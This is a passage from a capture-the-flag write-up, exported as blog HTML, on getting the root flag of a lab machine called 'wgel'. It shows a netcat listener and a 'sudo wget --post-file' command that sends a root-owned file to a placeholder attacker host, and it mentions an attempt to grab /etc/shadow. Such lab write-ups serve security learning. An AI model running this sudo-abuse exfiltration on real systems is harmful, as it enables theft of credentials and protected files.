href="https://gtfobins.github.io/gtfobins/wget/" target="_blank" rel="noopener">this</a> for wget.</p><h3 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h3><p>It seems like we can download files to another machine. We can use that knowledge to directly exfiltrate the root flag.<br>(Trust me it took me ages to figure that one out. I first tried to download /etc/shadow and simliar.)</p><p>So on my machine I listened for incoming connections on port 80 and stored the output in a file called “root_flag.txt”:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@hades      :~/ctf/thm/wgel<span class="comment"># nc -lnvp 80 &gt; root_flag.txt</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::80</span><br><span class="line">Ncat: Listening on 0.0.0.0:80</span><br><span class="line">Ncat: Connection from 10.10.54.255.</span><br><span class="line">Ncat: Connection from 10.10.54.255:36442.</span><br></pre></td></tr></table></figure><p>On the target machine I used wget with the “–post-file” flag to send the root flag to my machine.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jessie@CorpOne:~/Documents$ sudo /usr/bin/wget --post-file=/root/root_flag.txt <span class="variable">$YOUR_IP</span></span><br><span class="line">--2020-08-07 18:11:21--  http://<span class="variable">$YOUR_IP</span>/</span><br><span class="line">Connecting to <span class="variable">$YOUR_IP</span>:80... connected.</span><br><span class="line">HTTP request sent, awaiting response...</span><br></pre></td></tr></table></figure><p>You should now be able to cat out the root flag in the “root_flag.txt” file.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@hades:~/ctf/thm/wgel<span class="comment"># cat root_flag.txt</span></span><br><span class="line">ROOT_FLAG</span><br></pre></td></tr></table></figure><h2 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h2><p>And there you have it! I hope you had fun, I know I did 🦄</p>]]></content>
      
      
    </entry>
    
  
</search>
